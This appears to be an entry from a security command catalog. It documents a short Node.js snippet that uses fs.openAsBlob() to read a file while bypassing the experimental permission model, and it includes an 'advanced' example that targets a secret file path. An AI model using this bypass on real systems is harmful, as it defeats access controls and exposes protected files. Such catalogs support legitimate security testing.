---
id: cmd-fs-openasblob-read
data: >-
  const fs = require('node:fs'); async function main() { const blob = await
  fs.openAsBlob(__dirname + '/file.txt'); console.log(await blob.text()); }
  main();
tags:
  - nodejs
  - exploit
  - file-read
type: command
output: Contents of file.txt are printed to the console.
executor: javascript
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.833Z'
verified: false
validated: true
submitted: true
---
# fs-openasblob-read-file

## Command

```javascript
const fs = require('node:fs');
async function main() {
  const blob = await fs.openAsBlob(__dirname + '/file.txt');
  console.log(await blob.text());
}
main();
```

## Description

JavaScript code that uses fs.openAsBlob() to open and read a file as a Blob, bypassing Node.js experimental permissions. Executes within a Node.js script to demonstrate unauthorized file access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `__dirname + '/file.txt'` | Relative path to the target file | Yes |

## Examples

### Basic Usage

```javascript
const fs = require('node:fs');
async function main() {
  const blob = await fs.openAsBlob(__dirname + '/file.txt');
  console.log(await blob.text());
}
main();
```

### Advanced Usage

```javascript
const fs = require('node:fs');
async function main() {
  const blob = await fs.openAsBlob('/absolute/path/to/secret.txt');
  const text = await blob.text();
  // Process text further
}
main();
```

## Expected Output

The text contents of the specified file are logged to the console, e.g., "secret data" if that's the file content.

## Related

- [[Related Procedure|procedures/Exploit-fs.openAsBlob-for-Unauthorized-File-Read]]
